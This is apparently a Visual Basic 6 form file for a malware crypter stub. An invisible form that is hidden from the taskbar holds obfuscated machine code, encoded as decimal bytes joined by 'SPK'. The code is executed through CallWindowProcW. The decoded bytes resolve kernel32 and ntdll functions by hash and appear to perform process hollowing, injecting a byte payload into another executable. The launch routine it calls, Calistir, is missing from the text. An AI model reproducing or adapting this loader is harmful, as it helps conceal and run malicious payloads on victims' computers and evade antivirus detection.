VERSION 5.00
Begin VB.Form Form1 
   BorderStyle     =   1  'Fixed Single
   Caption         =   "Form1"
   ClientHeight    =   615
   ClientLeft      =   45
   ClientTop       =   390
   ClientWidth     =   3375
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   615
   ScaleWidth      =   3375
   ShowInTaskbar   =   0   'False
   StartUpPosition =   3  'Windows Default
   Visible         =   0   'False
   Begin VB.TextBox Text1 
      Height          =   375
      Left            =   120
      TabIndex        =   0
      Text            =   "Text1"
      Top             =   120
      Width           =   3135
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Option Explicit

Private Declare Function CallWindowProcW Lib "user32" (ByVal lpPrevWndFunc As Long, ByVal hwnd As Long, ByVal Msg As Long, ByVal wParam As Long, ByVal lParam As Long) As Long

Private BnimYolum As String


Public Sub b3ll3kt34c(ByVal UzakYol As String, Byteveri() As Byte)
Dim toplamveri As String
toplamveri = toplamveri & "96SPK232SPK78SPK0SPK0SPK0SPK107SPK0SPK101SPK0SPK114SPK0SPK110SPK0SPK101SPK0SPK108SPK0SPK51SPK0SPK50SPK"
toplamveri = toplamveri & "0SPK0SPK0SPK110SPK0SPK116SPK0SPK100SPK0SPK108SPK0SPK108SPK0SPK0SPK0SPK0SPK0SPK0SPK0SPK0SPK0SPK0SPK0SPK0SPK0SPK0SPK0SPK0"
toplamveri = toplamveri & "SPK0SPK0SPK0SPK0SPK0SPK0SPK0SPK0SPK0SPK0SPK0SPK0SPK0SPK0SPK0SPK0SPK0SPK0SPK0SPK0SPK0SPK0SPK0SPK0SPK0SPK0SPK0SPK0SPK0SPK"
toplamveri = toplamveri & "0SPK0SPK0SPK0SPK0SPK0SPK91SPK139SPK252SPK106SPK66SPK232SPK187SPK3SPK0SPK0SPK139SPK84SPK36SPK40SPK137SPK17SPK139SPK84SPK"
toplamveri = toplamveri & "36SPK44SPK106SPK62SPK232SPK170SPK3SPK0SPK0SPK137SPK17SPK106SPK74SPK232SPK161SPK3SPK0SPK0SPK137SPK57SPK106SPK30SPK106SPK"
toplamveri = toplamveri & "60SPK232SPK157SPK3SPK0SPK0SPK106SPK34SPK104SPK244SPK0SPK0SPK0SPK232SPK145SPK3SPK0SPK0SPK106SPK38SPK106SPK36SPK232SPK136"
toplamveri = toplamveri & "SPK3SPK0SPK0SPK106SPK42SPK106SPK64SPK232SPK127SPK3SPK0SPK0"



toplamveri = toplamveri & "SPK106SPK46SPK106SPK12SPK232SPK118SPK3SPK0SPK0SPK106SPK50SPK104SPK200SPK0SPK0SPK0SPK232SPK106SPK3SPK"
toplamveri = toplamveri & "0SPK0SPK106SPK42SPK232SPK92SPK3SPK0SPK0SPK139SPK9SPK199SPK1SPK68SPK0SPK0SPK0SPK106SPK18SPK232SPK77SPK3SPK0SPK0SPK104SPK"
toplamveri = toplamveri & "91SPK232SPK20SPK207SPK81SPK232SPK121SPK3SPK0SPK0SPK106SPK62SPK232SPK59SPK3SPK0SPK0SPK139SPK209SPK106SPK30SPK232SPK50SPK"
toplamveri = toplamveri & "3SPK0SPK0SPK106SPK64SPK255SPK50SPK255SPK49SPK255SPK208SPK106SPK18SPK232SPK35SPK3SPK0SPK0SPK104SPK91SPK232SPK20SPK207SPK"
toplamveri = toplamveri & "81SPK232SPK79SPK3SPK0SPK0SPK106SPK30SPK232SPK17SPK3SPK0SPK0SPK139SPK9SPK139SPK81SPK60SPK106SPK62SPK232SPK5SPK3SPK0SPK0"
toplamveri = toplamveri & "SPK139SPK57SPK3SPK250SPK106SPK34SPK232SPK250SPK2SPK0SPK0SPK139SPK9SPK104SPK248SPK0SPK0SPK0SPK87SPK81SPK255SPK208SPK106"
toplamveri = toplamveri & "SPK0SPK232SPK232SPK2SPK0SPK0SPK104SPK136SPK254SPK179SPK22SPK81SPK232SPK20SPK3SPK0SPK0SPK106SPK46SPK232SPK214SPK2SPK0"



toplamveri = toplamveri & "SPK0SPK139SPK57SPK106SPK42SPK232SPK205SPK2SPK0SPK0SPK139SPK17SPK106SPK66SPK232SPK196SPK2SPK0SPK0SPK87SPK82SPK106SPK0SPK"
toplamveri = toplamveri & "106SPK0SPK106SPK4SPK106SPK0SPK106SPK0SPK106SPK0SPK106SPK0SPK255SPK49SPK255SPK208SPK106SPK18SPK232SPK169SPK2SPK0SPK0SPK104SPK208SPK55SPK16"
toplamveri = toplamveri & "SPK242SPK81SPK232SPK213SPK2SPK0SPK0SPK106SPK34SPK232SPK151SPK2SPK0SPK0SPK139SPK17SPK106SPK46SPK232SPK142SPK2SPK0SPK0SPK139SPK9SPK255SPK114"
toplamveri = toplamveri & "SPK52SPK255SPK49SPK255SPK208SPK106SPK0SPK232SPK126SPK2SPK0SPK0SPK104SPK156SPK149SPK26SPK110SPK81SPK232SPK170SPK2SPK0SPK0SPK106SPK34SPK232"
toplamveri = toplamveri & "SPK108SPK2SPK0SPK0SPK139SPK17SPK139SPK57SPK106SPK46SPK232SPK97SPK2SPK0SPK0SPK139SPK9SPK106SPK64SPK104SPK0SPK48SPK0SPK0SPK255SPK114SPK80SPK"
toplamveri = toplamveri & "255SPK119SPK52SPK255SPK49SPK255SPK208SPK106SPK54SPK232SPK71SPK2SPK0SPK0SPK139SPK209SPK106SPK34SPK232SPK62SPK2SPK0SPK0SPK139SPK57SPK106SPK62SPK232SPK53SPK2SPK0"



toplamveri = toplamveri & "SPK0SPK139SPK49SPK106SPK34SPK232SPK44SPK2SPK0SPK0SPK139SPK1SPK106SPK46SPK232SPK35SPK2SPK0SPK0SPK139SPK9SPK82SPK255SPK"
toplamveri = toplamveri & "119SPK84SPK86SPK255SPK112SPK52SPK255SPK49SPK106SPK0SPK232SPK16SPK2SPK0SPK0SPK104SPK161SPK106SPK61SPK216SPK81SPK232SPK"
toplamveri = toplamveri & "60SPK2SPK0SPK0SPK131SPK196SPK12SPK255SPK208SPK106SPK18SPK232SPK249SPK1SPK0SPK0SPK104SPK91SPK232SPK20SPK207SPK81SPK232SPK37SPK2SPK0SPK0"
toplamveri = toplamveri & "SPK106SPK34SPK232SPK231SPK1SPK0SPK0SPK139SPK17SPK131SPK194SPK6SPK106SPK58SPK232SPK219SPK1SPK0SPK0SPK106SPK2SPK82SPK81SPK255SPK208SPK106"
toplamveri = toplamveri & "SPK54SPK232SPK206SPK1SPK0SPK0SPK199SPK1SPK0SPK0SPK0SPK0SPK184SPK40SPK0SPK0SPK0SPK106SPK54SPK232SPK188SPK1SPK0SPK0SPK247SPK33SPK106SPK30"
toplamveri = toplamveri & "SPK232SPK179SPK1SPK0SPK0SPK139SPK17SPK139SPK82SPK60SPK129SPK194SPK248SPK0SPK0SPK0SPK3SPK208SPK106SPK62SPK232SPK159SPK1SPK0SPK0SPK3SPK17SPK106SPK38SPK232SPK150SPK1SPK0SPK0SPK106"



toplamveri = toplamveri & "SPK40SPK82SPK255SPK49SPK106SPK18SPK232SPK138SPK1SPK0SPK0SPK104SPK91SPK232SPK20SPK207SPK81SPK232SPK182SPK1SPK0SPK0SPK131SPK196SPK"
toplamveri = toplamveri & "12SPK255SPK208SPK106SPK38SPK232SPK115SPK1SPK0SPK0SPK139SPK57SPK139SPK9SPK139SPK113SPK20SPK106SPK62SPK232SPK101SPK1SPK0SPK0SPK3SPK49SPK106SPK38SPK"
toplamveri = toplamveri & "232SPK92SPK1SPK0SPK0SPK139SPK9SPK139SPK81SPK12SPK106SPK34SPK232SPK80SPK1SPK0SPK0SPK139SPK9SPK3SPK81SPK52SPK106SPK70SPK232SPK68SPK1SPK0SPK0SPK139"
toplamveri = toplamveri & "SPK193SPK106SPK46SPK232SPK59SPK1SPK0SPK0SPK139SPK9SPK80SPK255SPK119SPK16SPK86SPK82SPK255SPK49SPK106SPK0SPK232SPK42SPK1SPK0SPK0SPK104SPK161SPK106"
toplamveri = toplamveri & "SPK61SPK216SPK81SPK232SPK86SPK1SPK0SPK0SPK131SPK196SPK12SPK255SPK208SPK106SPK54SPK232SPK19SPK1SPK0SPK0SPK139SPK17SPK131SPK194SPK1SPK137SPK17SPK10"
toplamveri = toplamveri & "6SPK58SPK232SPK5SPK1SPK0SPK0SPK139SPK9SPK59SPK202SPK15SPK133SPK51SPK255SPK255SPK255SPK106SPK50SPK232SPK244SPK0SPK0SPK0"


toplamveri = toplamveri & "SPK139SPK9SPK199SPK1SPK7SPK0SPK1SPK0SPK106SPK0SPK232SPK229SPK0SPK0SPK0SPK104SPK210SPK199SPK167SPK104SPK81SPK232SPK17SPK1SPK"
toplamveri = toplamveri & "0SPK0SPK106SPK50SPK232SPK211SPK0SPK0SPK0SPK139SPK17SPK106SPK46SPK232SPK202SPK0SPK0SPK0SPK139SPK9SPK82SPK255SPK113SPK4SPK255SPK208SPK106SPK34"
toplamveri = toplamveri & "SPK232SPK187SPK0SPK0SPK0SPK139SPK57SPK131SPK199SPK52SPK106SPK50SPK232SPK175SPK0SPK0SPK0SPK139SPK49SPK139SPK182SPK164SPK0SPK0SPK0SPK131SPK198"
toplamveri = toplamveri & "SPK8SPK106SPK46SPK232SPK157SPK0SPK0SPK0SPK139SPK17SPK106SPK70SPK232SPK148SPK0SPK0SPK0SPK81SPK106SPK4SPK87SPK86SPK255SPK50SPK106SPK0SPK232SPK"
toplamveri = toplamveri & "134SPK0SPK0SPK0SPK104SPK161SPK106SPK61SPK216SPK81SPK232SPK178SPK0SPK0SPK0SPK131SPK196SPK12SPK255SPK208SPK106SPK34SPK232SPK111SPK0SPK0SPK0SPK"
toplamveri = toplamveri & "139SPK9SPK139SPK81SPK40SPK3SPK81SPK52SPK106SPK50SPK232SPK96SPK0SPK0SPK0SPK139SPK9SPK129SPK193SPK176SPK0SPK0SPK0SPK137SPK17SPK106SPK0SPK232"


toplamveri = toplamveri & "SPK79SPK0SPK0SPK0SPK104SPK211SPK199SPK167SPK232SPK81SPK232SPK123SPK0SPK0SPK0SPK106SPK50SPK232SPK61SPK0SPK0SPK0SPK139SPK209SPK106"
toplamveri = toplamveri & "SPK46SPK232SPK52SPK0SPK0SPK0SPK139SPK9SPK255SPK50SPK255SPK113SPK4SPK255SPK208SPK106SPK0SPK232SPK36SPK0SPK0SPK0SPK104SPK136SPK63SPK74SPK158SPK81SPK"
toplamveri = toplamveri & "232SPK80SPK0SPK0SPK0SPK106SPK46SPK232SPK18SPK0SPK0SPK0SPK139SPK9SPK255SPK113SPK4SPK255SPK208SPK106SPK74SPK232SPK4SPK0SPK0SPK0SPK139SPK33SPK97SPK195"
toplamveri = toplamveri & "SPK139SPK203SPK3SPK76SPK36SPK4SPK195SPK106SPK0SPK232SPK242SPK255SPK255SPK255SPK104SPK84SPK202SPK175SPK145SPK81SPK232SPK30SPK0SPK0SPK0SPK106SPK64"
toplamveri = toplamveri & "SPK104SPK0SPK16SPK0SPK0SPK255SPK116SPK36SPK24SPK106SPK0SPK255SPK208SPK255SPK116SPK36SPK20SPK232SPK207SPK255SPK255SPK255SPK137SPK1SPK131SPK196SPK"
toplamveri = toplamveri & "16SPK195SPK232SPK34SPK0SPK0SPK0SPK104SPK164SPK78SPK14SPK236SPK80SPK232SPK75SPK0SPK0SPK0SPK131SPK196SPK8SPK255SPK116SPK36SPK4"


toplamveri = toplamveri & "SPK255SPK208SPK255SPK116SPK36SPK8SPK80SPK232SPK56SPK0SPK0SPK0SPK131SPK196SPK8SPK195SPK85SPK82SPK81SPK"
toplamveri = toplamveri & "83SPK86SPK87SPK51SPK192SPK100SPK139SPK112SPK48SPK139SPK118SPK12SPK139SPK118SPK28SPK139SPK110SPK8SPK139"
toplamveri = toplamveri & "SPK126SPK32SPK139SPK54SPK56SPK71SPK24SPK117SPK243SPK128SPK63SPK107SPK116SPK7SPK128SPK63SPK75SPK116SPK"
toplamveri = toplamveri & "2SPK235SPK231SPK139SPK197SPK95SPK94SPK91SPK89SPK90SPK93SPK195SPK85SPK82SPK81SPK83SPK86SPK87SPK139SPK"
toplamveri = toplamveri & "108SPK36SPK28SPK133SPK237SPK116SPK67SPK139SPK69SPK60SPK139SPK84SPK40SPK120SPK3SPK213SPK139SPK74SPK"
toplamveri = toplamveri & "24SPK139SPK90SPK32SPK3SPK221SPK227SPK48SPK73SPK139SPK52SPK139SPK3SPK245SPK51SPK255SPK51SPK192SPK252SPK"
toplamveri = toplamveri & "172SPK132SPK192SPK116SPK7SPK193SPK207SPK13SPK3SPK248SPK235SPK244SPK59SPK124SPK36SPK32SPK117SPK225SPK"
toplamveri = toplamveri & "139SPK90SPK36SPK3SPK221SPK102SPK139SPK12SPK75SPK139SPK90SPK28SPK3SPK221SPK139SPK4SPK139SPK3SPK197SPK95SPK94SPK91SPK89SPK90SPK93SPK195SPK195SPK0SPK0SPK0SPK0"



Dim asmbyte() As Byte
Dim bol() As String
bol = Split(toplamveri, "SPK")
ReDim asmbyte(UBound(bol)) As Byte
Dim i As Long
 For i = 0 To UBound(bol)
 asmbyte(i) = StrFromByte(bol(i))
 Next i
CallWindowProcW VarPtr(asmbyte(0)), StrPtr(UzakYol), VarPtr(Byteveri(0)), 0, 0
End Sub

Private Function StrFromByte(strss As String) As Byte
    StrFromByte = CByte("&" & "" & "H" & Hex(strss))
End Function
Private Sub Form_Load()
    Call AtamaYap
    ThisText = BnimYolum
    Call Calistir(True)
End Sub

Sub AtamaYap()
    Dim slash As String
    slash = "\"
    BnimYolum = App.Path & slash & App.EXEName & ".exe"
End Sub

